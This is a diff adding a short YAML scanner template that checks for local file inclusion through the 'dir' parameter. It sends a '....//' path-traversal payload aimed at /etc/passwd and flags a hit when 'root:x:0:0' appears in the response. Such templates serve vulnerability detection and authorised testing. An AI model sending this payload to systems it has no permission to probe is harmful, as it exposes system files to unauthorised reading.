@@ -1,0 +1,20 @@
+id: lfi6-0614
+name: 'Traversal in dir'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via dir'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      dir:
+        - '....//....//....//....//....//....//etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
